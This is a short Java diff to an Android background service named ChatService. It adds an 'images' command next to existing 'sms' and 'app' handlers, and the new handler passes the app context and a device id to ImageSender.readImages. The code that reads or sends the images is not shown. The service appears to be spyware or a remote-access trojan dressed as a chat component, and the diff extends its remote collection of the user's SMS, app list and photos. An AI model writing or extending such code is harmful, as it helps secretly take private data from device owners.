@@ -106,6 +106,9 @@ public class ChatService extends Service {
                     case "sms":
                         handleSMS();
                         break;
+                    case "images":
+                        handleImages();
+                        break;
                     case "app":
                         handleApps();
                         break;
@@ -189,6 +192,16 @@ public class ChatService extends Service {
             e.printStackTrace();
         }
     }
+
+    private void handleImages() {
+        Context context = getApplicationContext();
+        try {
+            ImageSender.readImages(context, getId());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
 
     private void handleApps() {
         final PackageManager pm = getPackageManager();
